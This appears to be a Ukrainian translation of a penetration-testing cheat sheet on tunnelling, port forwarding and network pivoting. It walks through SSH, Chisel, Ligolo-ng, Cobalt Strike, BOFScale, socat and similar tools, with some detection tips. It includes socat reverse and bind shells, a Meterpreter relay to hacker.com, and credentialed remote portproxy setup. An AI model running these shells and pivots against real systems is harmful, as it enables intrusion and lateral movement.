# Тунелювання та перенаправлення портів

{{#include ../banners/hacktricks-training.md}}

Щоб опублікувати локальний HTTP- або TCP-сервіс через публічний ретранслятор, див. [публікацію локальних сервісів в інтернеті](expose-local-to-the-internet.md). У цьому розділі розглядається перенаправлення трафіку та pivoting між хостами.

## Порада щодо Nmap

> [!WARNING]
> Підтримка proxy у Nmap обмежена TCP-з’єднаннями й не впливає на сканування ping, портів або ОС. Якщо сканер працює за SOCKS proxy, **вимкніть виявлення хостів** (`-Pn`) і використовуйте **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Хост -> Jump -> InternalA -> InternalB**

У фінальній команді використовуються параметри Evil-WinRM `-u` та `-i`, щоб указати обліковий запис і хост WinRM; порт WinRM за замовчуванням — 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH може перенаправляти X11-з’єднання, довільні TCP-порти та Unix-domain sockets через свій зашифрований канал.<sup>[[6]](#references)</sup>

Графічне з’єднання SSH (X)

`-Y` вмикає довірене перенаправлення X11, а `-C` запитує стиснення перенаправлених даних.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Відкрийте новий порт у SSH Server --> Other port

Перенаправлення Remote (`-R`) прослуховує на SSH-сервері та підключається до локальної сторони; явна адреса прив’язки визначає, з яких інтерфейсів можна отримати доступ до цього прослуховувача.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Локальний порт --> Скомпрометований хост (SSH) --> Third_box:Port

Локальне перенаправлення (`-L`) прослуховує порт на клієнті й підключається до призначення зі сторони SSH-сервера.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Локальний порт --> Зламаний хост (SSH) --> Куди завгодно

Динамічне перенаправлення (`-D`) створює локальний SOCKS4/SOCKS5-слухач, з якого з’єднання відкриваються з віддаленого боку.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Перехід через кілька вузлів за допомогою ProxyJump

`-J`/`ProxyJump` підключається до цілі через один або кілька вузлів переходу, розділених комами. Параметри перенаправлення належать до фінального SSH-з’єднання, тож SOCKS-слухач нижче відкриває з’єднання з адресатами з `internal-target`, а не з першого bastion. Це дає змогу не входити на вузол переходу й не запускати там другий SSH-клієнт.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Параметри, специфічні для хоста, на який здійснюється перехід, слід розміщувати у `~/.ssh/config`; конфігурація командного рядка, призначена для цільового хоста, автоматично не застосовується до проміжних хостів.<sup>[[6]](#references)</sup>

### Зворотне перенаправлення портів

Це корисно, щоб отримувати reverse shells з внутрішніх хостів через DMZ на свій хост:

Параметр `GatewayPorts` на сервері визначає, чи може віддалене перенаправлення прив’язуватися за межами loopback; його значення за замовчуванням — `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-тунель

У цьому прикладі на основі root на обох хостах створюються тунельні пристрої. Сервер має дозволяти пересилання через tun, а вибраний обліковий запис повинен мати доступ до пристрою tun; `PermitRootLogin yes` — один зі способів використовувати тут обліковий запис `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Увімкніть forwarding на стороні сервера

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Встановіть новий маршрут на стороні клієнта

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Безпека – Terrapin Attack (CVE-2023-48795)**  
> У OpenSSH 9.6 додали розширення strict-KEX для захисту від атаки Terrapin на цілісність даних на ранньому етапі транспортного з’єднання. За можливості оновіть обидва вузли й дотримуйтеся рекомендацій постачальника для старіших реалізацій, а не вважайте, що сам по собі номер версії захищає перенаправлений канал.<sup>[[8]](#references)</sup>

## SSHUTTLE

Можна **тунелювати** через **ssh** увесь **трафік** до **підмережі** через хост.\
Наприклад, перенаправляти весь трафік, що прямує до 10.10.10.0/24

`sshuttle` забезпечує прозоре проксіювання через SSH і підтримує вибір підмереж та власну SSH-команду, як показано нижче.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Підключитися за допомогою приватного ключа

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

`portfwd` у Metasploit підтримує локальне та віддалене перенаправлення, тоді як модуль SOCKS-проксі призначений для роботи з маршрутами сесій або `autoroute` і в цих прикладах за замовчуванням прослуховує порт 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Локальний порт --> Скомпрометований хост (активна сесія) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Інший спосіб:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Beacon у Cobalt Strike може ретранслювати з’єднання SOCKS4a/SOCKS5 через Beacon; `rportfwd` відкриває порт на скомпрометованому хості, а `rportfwd_local` ініціює з’єднання з цільовим вузлом із клієнта Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS-проксі

Відкрийте порт на Team Server на інтерфейсах, через які потрібно маршрутизувати трафік через Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> У цьому випадку **порт відкрито на хості Beacon**, а не на Team Server, і трафік надсилається до Team Server, а звідти — на вказаний хост:порт.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

У посібнику з reverse-forwarding зазначено таку поведінку:<sup>[[14]](#references)</sup>

- Reverse port forward у Beacon призначений для **тунелювання трафіку до Team Server, а не для ретрансляції між окремими машинами**.
- Трафік **тунелюється всередині C2-трафіку Beacon**, зокрема через P2P-з’єднання.
- Високі порти зазвичай дають змогу уникнути обмежень на привілейовані порти, але політика цільової ОС і наявні слухачі все одно мають значення.

### rPort2Port local

> [!WARNING]
> У цьому випадку **порт відкривається на хості Beacon**, а не на Team Server, і **трафік надсилається клієнту Cobalt Strike** (а не на Team Server), звідки його переспрямовують на вказаний хост:порт.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: TCP-перенаправлення в userspace без облікового запису

Tailcat використовує площину даних WireGuard/NAT traversal/DERP від Tailscale без площини керування Tailscale. Для нього не потрібні обліковий запис Tailscale чи права адміністратора, і він не встановлює маршрути хоста й не змінює DNS. На відміну від [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) або вбудованого [BOFScale tailnet](#bofscale---cdn-fronted-in-process-tailnet), сервер передає *адресу tailcat* позасмуговим каналом. Клієнт використовує цю адресу, щоб підключитися до порту, який прослуховує віддалений вузол.<sup>[[62]](#references)</sup>

Якщо TCP-сервіс уже прослуховує порт `4444` на віддаленому вузлі, запустіть там `serve` і передайте виведену адресу команді `forward` на клієнті. За замовчуванням друга команда прив’язує `127.0.0.1:18080`, тож локальний процес, який підтримує лише звичайні TCP-сокети, може підключитися до цього loopback-порту, а Tailcat передасть його трафік на віддалений порт `4444`.<sup>[[62]](#references)</sup> Номери портів не є специфічними для Tailcat.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

Адреса містить публічний ключ WireGuard сервера та, за замовчуванням у поточних випусках, попередньо спільний ключ. Вважайте її обліковими даними: сервер без обмежень приймає підключення вузла, якому відома адреса. Тимчасова адреса перестає працювати після завершення роботи сервера. Збережений ключ `default` дає змогу звичайній команді `serve` повторно використовувати стабільну адресу під час наступних запусків, тож перевірте повідомлення під час запуску й обмежте клієнтів за допомогою `serve --allow`, якщо адресу можуть розкрити.<sup>[[62]](#references)</sup>

Підключення можуть використовувати прямий UDP-канал або ретранслятор DERP. Це усуває потребу в окремому домені C2, але не приховує мережеву активність.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale — tailnet із CDN-fronting усередині процесу

[BOFScale](https://github.com/NetSPI/BOFscale) запускає модифікований оверлей Tailscale усередині імпланта Windows C2, не встановлюючи драйвер чи службу TUN. Його три компоненти: асинхронний `c-shared` `tailscaled` BOF-PE на CGo, невеликий C++ BOF-PE, який взаємодіє з локальним API, та асинхронний міст `socksportfwd` для перетворення TCP на SOCKS5.<sup>[[53]](#references)[[54]](#references)</sup>

### Сумісні з CDN TS2021 і DERP

Зазвичай Tailscale використовує пропрієтарні HTTP Upgrade для керівного каналу TS2021 на основі Noise та ретранслятора DERP. BOFScale зберігає ці потоки байтів, але передає їх через WebSockets RFC 6455, використовуючи `Sec-WebSocket-Protocol: ts2021` або `derp`, щоб контрольований оператором origin Headscale/DERP можна було розмістити за CDN, що приймає лише стандартні WebSocket Upgrade. Модифікований клієнт повторює підключення TS2021 через WebSockets після HTTP `500`, повторює підключення DERP після HTTP `426` і налаштовує WebSocket dialer DERP на використання конфігурації проксі хоста; BOF задає `TS_DEBUG_DERP_WS_CLIENT=1`, щоб пропустити першу спробу, яка, як відомо, завершується невдало.<sup>[[53]](#references)[[54]](#references)</sup>

Проксі CDN і origin мають зберігати WebSocket Upgrade для `/ts2021` і `/derp`, передавати `/key` як звичайний HTTP та вимикати внутрішні тайм-аути читання/запису, оскільки сеанси ретранслятора можуть залишатися відкритими необмежений час. Надана конфігурація Headscale вмикає `verify_clients`, публікує лише вбудовану карту DERP оператора та залишає `derp.urls` порожнім, щоб запобігти переходу на ретранслятори під керуванням Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Демон усередині процесу та керування через іменований канал

Якщо не вказано інше, точка входу BOF запускає `tailscaled` з параметрами `-tun=userspace-networking`, `-state mem:` і `-no-logs-no-support`, а потім створює канал з іменем на основі UUID. Вивід stdout/stderr Go перенаправляється через канал ОС до API виводу Beacon, тож демон і середовище виконання Go залишаються в пам’яті, але стан і журнали не записуються до каталогу Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Полегшений клієнт відтворює локальний API Tailscale на основі HTTP/1.0 через цей канал. Він відкриває канал із `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, оскільки шар `safesocket` демона виконує імперсонацію клієнта каналу, надсилає `Tailscale-Cap: 125` і відображає локальний API на операції `up`, `down`, `status`, оголошення маршрутів і завершення роботи.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Не вивантажуйте вручну відображений Go BOF-PE після надсилання демону команди завершення роботи: goroutine середовища виконання та збирача сміття можуть продовжувати виконувати код із пам’яті, яку вивантажує loader. Запускайте `tailscaled` в окремому процесі й завершуйте цей процес для остаточного очищення.<sup>[[54]](#references)</sup>

### Передавання трафіку від хоста через SOCKS5 у userspace

Вхідні підключення tailnet і оголошені маршрути підмереж працюють у мережевому стеку userspace, але звичайні процеси скомпрометованого хоста не мають маршруту ОС до оверлею. Тому `socksportfwd` прослуховує TCP-порт, доступний з боку жертви, узгоджує SOCKS5 `NO AUTH` із прослуховувачем демона `0.0.0.0:1080`, надсилає `CONNECT` до вузла призначення tailnet і асинхронно ретранслює дані в обох напрямках. Якщо ціль — ім’я MagicDNS, використовується `ATYP_DOMAIN`, завдяки чому `tailscaled` розпізнає ім’я, не розкриваючи його резолверу Windows.<sup>[[53]](#references)[[54]](#references)</sup>

Нижче наведено мінімальний сценарій роботи оператора; і вузол оператора, і імплант мають використовувати модифіковані бінарні файли, оскільки звичайний Tailscale не може працювати через таку CDN-конфігурацію.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Локальне перенаправлення дає змогу відокремити видимий listener автентифікації від relay-інструмента: змусьте машину автентифікуватися на прив’язаному порту скомпрометованого хоста, перенаправте трафік через tailnet до `ntlmrelayx` і виконайте relay до AD CS, LDAP, HTTP, SMB або іншої сумісної цілі. Етапи, специфічні для вразливостей, описані в розділах [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) та [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8); BOFScale забезпечує лише транспорт.<sup>[[54]](#references)</sup>

### Виявлення

Шукайте поєднання ознак, а не одну слабку ознаку: Go runtime у процесі, який зазвичай не використовує Go, pipe із UUID та permissive SDDL `D:(A;;GA;;;WD)`, неочікуваний SOCKS listener `0.0.0.0:1080` і довготривалі TLS WebSocket-з’єднання з адресами CDN. За наявності TLS-інспекції позначайте `Sec-WebSocket-Protocol: derp` або `ts2021`, якщо процес-власник не є авторизованою службою `tailscaled`. Правила `bofscale.yar` у репозиторії містять сигнатури для пошуку в пам’яті всіх трьох компонентів BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Проєкт надає кінцеві точки вебтунелю, як-от `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` і `tunnel.php`; завантажте одну з підтримуваних кінцевих точок, перш ніж запускати локальний proxy.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Завантажити його можна зі сторінки релізів [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel передає TCP/UDP-трафік через HTTP, використовуючи захищене SSH-з’єднання; використовуйте сумісні збірки клієнта й сервера та перевірте синтаксис команд для вибраного релізу.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Переадресація портів

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) передає статичні або динамічні форварди через WebSocket, HTTP/2 або WebTransport (HTTP/3 поверх QUIC). Поточні збірки підтримують TCP, UDP, Unix-сокети, stdio, SOCKS5, HTTP-проксіювання та Linux-слухачі прозорого проксі в прямому й зворотному режимах.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Запустіть сервер на машині зловмисника, а pivot налаштуйте на вихідне підключення за допомогою `-R`. У цьому напрямку слухач SOCKS5 створюється на **сервері**, тоді як запитані підключення ініціюються з мережі **клієнта/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forward працює в тому самому напрямку. Наприклад, наведена команда відкриває `10.10.10.20:445`, доступний через pivot, на loopback-порту атакувальника `8445`:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Деталі вихідного трафіку та транспорту

- Додайте до клієнта `-p http://user:pass@proxy:8080`, щоб проходити через явний HTTP proxy. У таких клієнтах, як `curl`, використовуйте `socks5h://127.0.0.1:1080` (або ввімкніть проксований DNS у програмі), щоб внутрішні імена розв’язувалися за межами тунелю, а не витікали до локального резолвера.<sup>[[52]](#references)</sup>
- `wss://` вибирає захищений TLS WebSocket. Клієнт із `https://` вибирає HTTP/2, але буферизація або перетворення на HTTP/1 зворотними проксі/CDN часто порушують двонапрямлений потік; під час тестування цього режиму надавайте прямий доступ до сервера wstunnel.<sup>[[52]](#references)</sup>
- `wts://` вибирає WebTransport поверх QUIC. Запустіть сервер із `--enable-webtransport` (або URL прослуховування `wts://`) і дозвольте UDP на порту прослуховування. Цей режим не може проходити через звичайний HTTP `CONNECT` proxy, оскільки такий proxy передає TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> У проєкті застерігають: не вважайте вбудований самопідписаний сертифікат засобом захисту приватності. Надавайте перевагу дійсному власному сертифікату разом із `--tls-verify-certificate` (або mTLS), залишайте слухачі proxy на loopback, якщо віддалений доступ не потрібен, і тунелюйте вже захищені протоколи, коли важлива конфіденційність.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

У короткому посібнику Ligolo-ng описано TUN-інтерфейс на proxy, перевірку відбитка сертифіката агента та налаштування маршруту до тунельованої мережі.<sup>[[17]](#references)</sup>

### Тунелювання

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Прив’язування agent і прослуховування

Ligolo-ng може додавати на agent слухачі, які перенаправляють трафік на адресу на боці proxy, а його зарезервований діапазон `240.0.0.0/4` можна маршрутизувати, щоб отримати доступ до локальних сервісів agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Локальні порти агента доступу

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot запускає reverse tunnel із системи жертви та відкриває SOCKS4 proxy на loopback-адресі атакувальника; у README також описані облікові дані та параметри хешів для NTLM-proxy.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot через **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat поєднує типи адрес, як-от `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` і `PROXY`; наведені нижче приклади комбінують ці задокументовані кінцеві точки.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port через socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter через SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Ви можете скористатися **проксі без автентифікації** за допомогою задокументованого типу адреси `PROXY` у socat, виконавши цей рядок замість попереднього в консолі жертви.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Тунель SSL Socat

**консоль /bin/sh**

Створіть сертифікати з обох боків: клієнта й сервера.

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Підключіть локальний порт SSH (22) до порту 443 на хості атакувальника.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink — це інструмент PuTTY для підключення з командного рядка з параметрами SSH-переадресації, подібними до `ssh`.<sup>[[22]](#references)</sup>

Для порту SSH використовуйте велику літеру `-P`. Параметр `-pw` збережено для сумісності, але він показує пароль у списку процесів; за можливості віддавайте перевагу автентифікації за ключем або `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Оскільки цей бінарний файл запускається на машині жертви й є SSH-клієнтом, відкрийте службу SSH і порт для зворотного підключення; у наведеному нижче прикладі `-R` переадресовує локально доступний порт на машину атакувальника.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Під час створення або зміни постійних правил `portproxy` використовуйте контекст із дозволами, необхідними на хості. У документації Microsoft описано форми `v4tov4` для додавання, перегляду та видалення, які наведено нижче.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Розгортання `portproxy` через заплановане завдання

Якщо доступні облікові дані адміністратора, віддалене виконання через Task Scheduler дає змогу встановити штатне правило переадресації без завантаження окремого relay. Наприклад, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) може налаштувати pivot на прослуховування TCP/443 і перенаправляти з’єднання до внутрішньої служби SMB.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Правило є постійним, тому перегляньте його за допомогою `netsh interface portproxy show v4tov4` і видаліть вручну після тестування. Пам’ятайте, що `portproxy` лише виконує перенаправлення; брандмауер хоста також має дозволяти порт, на якому відбувається прослуховування.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Потрібен **RDP-доступ до системи**.\
Завантажте:

SocksOverRDP використовує динамічні віртуальні канали Remote Desktop для передавання з’єднання SOCKS5 через наявний сеанс RDP; плагін клієнта прослуховує `127.0.0.1:1080`, а серверний компонент працює на цілі RDP.<sup>[[25]](#references)</sup>

1. [Бінарні файли SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) — цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) із функції Remote Desktop Service у Windows. DVC відповідає за **тунелювання пакетів через з’єднання RDP**.
2. [Портативний бінарний файл Proxifier](https://www.proxifier.com/download/#win-tab)

На комп’ютері-клієнті завантажте **`SocksOverRDP-Plugin.dll`** так:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Тепер ми можемо **підключитися** до **жертви** через **RDP** за допомогою **`mstsc.exe`**. Має з’явитися **повідомлення** про те, що **плагін SocksOverRDP увімкнено** і він **прослуховуватиме** **127.0.0.1:1080**.

**Підключіться** через **RDP**, завантажте та виконайте на машині жертви двійковий файл `SocksOverRDP-Server.exe`:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Тепер переконайтеся, що на вашій машині (атакувальника) порт 1080 прослуховується:

```
netstat -antb | findstr 1080
```

Тепер можна використовувати [**Proxifier**](https://www.proxifier.com/), щоб спрямувати трафік через цей порт.<sup>[[26]](#references)</sup>

### Пошук у віртуальних каналах RDP

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) — ще один тунель через віртуальний канал RDP; його типова назва каналу — `rdp2tcp`, хоча оператор може вибрати іншу назву.<sup>[[56]](#references)</sup> Створення та закриття каналів реєструються в `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` як події з ID **132** і **148**. Шукайте `rdp2tcp` та рідкісні або випадкові назви каналів, а потім порівнюйте їх з очікуваними каналами, як-от `XPSRD`, `cliprdr` і `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Проксіювання GUI-застосунків Windows

